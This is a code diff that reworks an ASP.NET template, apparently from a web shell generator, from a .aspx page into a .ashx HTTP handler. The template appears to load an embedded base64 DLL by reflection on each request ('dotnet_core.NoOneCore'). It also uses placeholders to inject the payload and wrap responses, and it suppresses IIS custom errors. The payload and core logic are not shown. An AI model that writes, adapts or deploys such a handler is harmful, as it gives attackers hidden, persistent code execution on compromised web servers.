@@ -1,11 +1,14 @@
-<%@ Page Language="C#" %>
+<%@ WebHandler Class="Handler" Language="C#" %>
 <%@ Import Namespace="System" %>
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Reflection" %>
 <%@ Import Namespace="System.Text" %>
+<%@ Import Namespace="System.Web" %>
 __EXTRA_IMPORTS__
 
 <script runat="server">
+public class Handler : IHttpHandler
+{
     private const string CoreTypeName = "dotnet_core.NoOneCore";
 
     private static readonly object CoreLock = new object();
@@ -15,7 +18,17 @@ __EXTRA_IMPORTS__
 __CORE_DLL_BASE64__
 ".Replace("\r", string.Empty).Replace("\n", string.Empty);
 
-    protected void Page_Load(object sender, EventArgs e)
+    private HttpRequest Request
+    {
+        get { return HttpContext.Current.Request; }
+    }
+
+    private HttpResponse Response
+    {
+        get { return HttpContext.Current.Response; }
+    }
+
+    public void ProcessRequest(HttpContext context)
     {
         Response.TrySkipIisCustomErrors = true;
 
@@ -57,6 +70,11 @@ __CORE_DLL_BASE64__
             }
             catch { }
         }
+    }
+
+    public bool IsReusable
+    {
+        get { return true; }
     }
 
     private object GetOrInitCore()
@@ -108,4 +126,5 @@ __WRAP_RES_DATA__
 __WRAP_RESPONSE__
 
 __EXTRA_HELPERS__
+}
 </script>
